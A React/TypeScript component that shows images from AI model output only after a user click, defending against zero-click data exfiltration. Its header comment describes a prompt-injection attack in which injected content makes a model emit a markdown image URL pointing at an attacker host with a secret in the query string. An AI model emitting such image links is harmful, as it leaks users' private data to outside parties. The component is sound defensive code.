/**
 * Click-to-load image for AI output. Model output is untrusted: an auto-loaded
 * remote `<img>` is a zero-click exfiltration channel (EchoLeak) — a prompt-
 * injected note/web result can make the model emit
 * `![](https://attacker/p.png?d=<secret>)`, which the webview would GET on render
 * with private data in the query string, no click or write tool required. So we
 * NEVER auto-fetch a remote image: we show a placeholder naming the host and only
 * load it after an explicit user click. Locally-generated `blob:`/`data:` images
 * (future image-gen artifacts) load directly. Scheme is still gated via safeImageSrc.
 */
import { useState } from "react";
import { Image as ImageIcon } from "lucide-react";
import { cn } from "@/lib/utils";
import { safeImageSrc } from "./safeUrl";

function isLocal(src: string): boolean {
  return src.startsWith("blob:") || src.startsWith("data:");
}

function hostOf(src: string): string {
  try {
    return new URL(src).host || "remote source";
  } catch {
    return "remote source";
  }
}

export function SafeImage({
  src,
  alt,
  className,
  onLoaded,
}: {
  src?: string;
  alt?: string;
  className?: string;
  /** Called once the user opts to load the image (lets callers add a lightbox). */
  onLoaded?: () => void;
}) {
  const safe = safeImageSrc(typeof src === "string" ? src : undefined);
  const [show, setShow] = useState(() => !!safe && isLocal(safe));
  if (!safe) return null;

  if (show) {
    return (
      <img
        src={safe}
        alt={alt ?? ""}
        loading="lazy"
        className={className ?? "my-2 max-h-80 rounded-lg"}
      />
    );
  }

  return (
    <button
      type="button"
      onClick={() => {
        setShow(true);
        onLoaded?.();
      }}
      title={safe}
      className={cn(
        "my-2 flex items-center gap-2 rounded-lg border border-border bg-surface px-3 py-2 text-xs text-soft transition-colors hover:border-primary/30 hover:text-heading",
      )}
    >
      <ImageIcon size={14} className="shrink-0 text-muted" />
      <span className="truncate">Load image from {hostOf(safe)}</span>
    </button>
  );
}
